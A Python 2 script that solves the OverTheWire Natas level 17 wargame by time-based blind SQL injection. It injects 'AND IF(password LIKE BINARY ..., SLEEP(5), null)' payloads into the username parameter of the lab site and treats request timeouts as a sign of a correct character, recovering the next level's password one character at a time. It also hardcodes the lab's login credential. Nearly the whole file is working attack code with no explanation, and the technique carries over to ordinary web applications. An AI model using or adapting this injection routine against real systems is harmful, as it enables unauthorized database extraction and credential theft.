#!/usr/bin/python
#h15h4m


import requests
from requests.auth import HTTPBasicAuth


http_username = "natas17"
http_password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
target =  "http://natas17.natas.labs.overthewire.org/"
http_login=HTTPBasicAuth(http_username, http_password)
chars_to_check = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
password_chars_found = ''
password = ''
r = requests.get(target, auth=http_login)

if  r.status_code != requests.codes.ok:
    print "[-] Check Authentication"
    exit()


print "[!] We are in"



#natas18" AND IF(password LIKE BINARY "%0%", SLEEP(100), null) #

for i in chars_to_check:
    payload = 'natas18" AND IF(password LIKE BINARY "%'+ i +'%", SLEEP(5), null) %23'
    try:
        r = requests.get(target + "index.php?debug=1&username=" + payload, auth=http_login,timeout=1)
    except:
        print "[+] Timeout: Char Found " + i
        password_chars_found += i

print '[!] Found Chars ' + password_chars_found

#md5 32 chars
for i in range(32):
    for ii in password_chars_found:
        payload = 'natas18" AND IF(password LIKE BINARY "'+ password + ii +'%", SLEEP(5), null) %23'
        try:
            r = requests.get(target + "index.php?debug=1&username=" + payload, auth=http_login,timeout=1)
        except:
            print "[+] Timeout: Char Found " + ii
            password += ii
            break


print '[!] PASSWORD = ' + password

#print r.content